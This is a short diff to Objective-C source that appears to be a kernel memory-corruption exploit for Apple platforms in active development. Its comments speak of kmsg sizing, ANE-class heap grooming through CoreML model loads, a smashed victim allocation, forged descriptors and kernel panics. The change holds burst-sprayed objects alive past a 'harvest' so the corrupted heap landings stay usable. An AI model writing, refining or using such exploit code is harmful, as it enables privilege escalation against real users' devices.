@@ -48,7 +48,7 @@
 #import <sys/socket.h>
 #import <netinet/in.h>
 
-#define P073_BUILD @"p073-second-table-v7h-inpcb-dial"
+#define P073_BUILD @"p073-second-table-v7i-hold-window"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -68,6 +68,11 @@ static uint32_t g_p073_inpcbN;
 #define P073_254_RETRY    3u     /* v3: bounded fill re-fire attempts (v2's 8ms -1
                                     looked like NO-FILL, dirty-ANE suspect: p099
                                     ran 90s before this tap on the same boot) */
+/* v7i: the B6 burst fresh tables held PAST the harvest — their chunk frees
+   were the MAF freed-lane (5 panic packs 21:55-22:46: the smashed 3072-class
+   victim was freed in-window before the D2 recv could measure descForged).
+   Retaining until after the sentinel harvest keeps the landings LIVE. */
+static NSMutableArray *g_p073_burstHoldersRef;
 #define P073_SMALL_BURST  16u    /* v4: burst smalls across the 254 marshal window
                                     (single small dies in ~1ms = empty neighbor) */
 #define P073_SMALL_BURST_GAP_US 10000u
@@ -781,6 +786,7 @@ static NSURL *p073_model_url(NSString *name) {
         dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
             p073_pin_cpu_b();
             NSMutableArray *holders = [NSMutableArray array];
+            g_p073_burstHoldersRef = holders;  /* v7i: alive past harvest */
             __block unsigned smallLoads = 0;
             for (uint32_t k = 0; k < P073_SMALL_BURST; k++) {
                 MLModelConfiguration *cfgB = [[MLModelConfiguration alloc] init];
